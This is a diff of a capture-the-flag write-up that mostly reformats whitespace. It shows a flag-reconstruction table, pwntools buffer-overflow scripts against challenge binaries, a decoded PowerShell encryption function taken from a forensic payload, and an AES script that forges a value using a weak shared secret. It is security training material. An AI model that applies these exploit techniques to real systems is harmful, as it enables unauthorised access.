@@ -268,91 +268,48 @@ I started asking "could this be the letter of the flag and its position?"... Got
 
 ```
 char index
-
 c     33
-
 _     21
-
 0     34
-
 t     13
-
 u     40
-
 p     8
-
 m     30
-
 h     19
-
 1     29
-
 m     41
-
 r     15
-
 n     35
-
 B     3
-
 H     1
-
 c     25
-
 _     12
-
 _     27
-
 p     7
-
 }     100
-
 t     28
-
 _     17
-
 1     37
-
 u     39
-
 t     18
-
 p     23
-
 t     36
-
 3     26
-
 n     38
-
 1     9
-
 {     4
-
 s     22
-
 !     42
-
 T     2
-
 n     10
-
 3     31
-
 g     11
-
 h     14
-
 u     16
-
 _     32
-
 h     5
-
 0     6
-
 4     24
-
 3     20
 ```
 
@@ -406,10 +363,7 @@ Since it was using strcmp which will compare strings until it finds a NULL chara
 The string that was being compared was 52 bytes, so If I filled the rest of the buffer with  \x00 it would be enough so testing it locally I got the fake flag... so using the same code I tested it remotely to get the real flag
 
 ```python
-#!/usr/bin/env python
-
 from pwn import *
-
 
 offset = 53
 
@@ -443,9 +397,7 @@ Another way I found to get the flag, was to simply send 53 "A" and trigger a buf
 #!/usr/bin/env python
 from pwn import *
 
-
 offset = 53
-
 p = process("./sp_going_deeper")
 # p = remote("165.22.119.112", 30453)
 
@@ -497,7 +449,6 @@ Using cyberchef I decoded the payload and got a powershell script that needed to
 Every 3 points in a row is a point, every other point is nothing... so at the end I got
 ```powershell
 function encr {
-
 param(
 [Byte[]]$data,
 [Byte[]]$key
@@ -530,7 +481,6 @@ $s[$j] = $temp;
 [int]$t = ($s[$i] + $s[$j]) % 256;
 $buffer[$x] = $buffer[$x] -bxor $s[$t];
 }
-
 return $buffer
 
 }
@@ -747,27 +697,20 @@ I used python to parse this and eliminate duplicates and output a base64 encode.
 ```python
 import base64
 
-  
-
 unique_lines = []
-
 with open("dup_hex", "r") as f:
-
 lines = f.readlines()
-
 lines = [line.rstrip() for line in lines]
 
 for line in lines:
-
-if line not in unique_lines:
-
-unique_lines.append(line)
+   if line not in unique_lines:
+      unique_lines.append(line)
 
   
 result=""
 for line in unique_lines:
-tmp = base64.b64encode(line.encode("ascii"))
-result += "\"" + str(tmp, "ascii") + "\", " 
+   tmp = base64.b64encode(line.encode("ascii"))
+   result += "\"" + str(tmp, "ascii") + "\", " 
 print(result)
 ```
 
@@ -802,39 +745,23 @@ Coded an exploit to encrypt the string the application needed.
 
 ```python
 from Crypto.Cipher import AES
-
 import hashlib
-
 import binascii
 
   
-
 def encrypt(encrypted, shared_secret):
-
-key = hashlib.md5(long_to_bytes(shared_secret)).digest()
-
-cipher = AES.new(key, AES.MODE_ECB)
-
-message = cipher.encrypt(str.encode(encrypted))
-
-return message
-
-  
-  
+   key = hashlib.md5(long_to_bytes(shared_secret)).digest()
+   cipher = AES.new(key, AES.MODE_ECB)
+   message = cipher.encrypt(str.encode(encrypted))
+   return message
 
 sequence = "Initialization Sequence - Code 0"
-
 p = 0x509efab16c5e2772fa00fc180766b6e62c09bdbd65637793c70b6094f6a7bb8189172685d2bddf87564fe2a6bc596ce28867fd7bbc300fd241b8e3348df6a0b076a0b438824517e0a87c38946fa69511f4201505fca11bc08f257e7a4bb009b4f16b34b3c15ec63c55a9dac306f4daa6f4e8b31ae700eba47766d0d907e2b9633a957f19398151111a879563cbe719ddb4a4078dd4ba42ebbf15203d75a4ed3dcd126cb86937222d2ee8bddc973df44435f3f9335f062b7b68c3da300e88bf1013847af1203402a3147b6f7ddab422d29d56fc7dcb8ad7297b04ccc52f7bc5fdd90bf9e36d01902e0e16aa4c387294c1605c6859b40dad12ae28fdfd3250a2e9
 
 shared_secret = 1
-
-  
-
 encrypted_sequence = binascii.hexlify(encrypt(sequence, shared_secret))
-
-  
-
 print(encrypted_sequence)
+
 ```
 
 The output was - 7fd4794e77290bf65808e95467f284966d71995c16e83da2192aecfd2d0df7a4
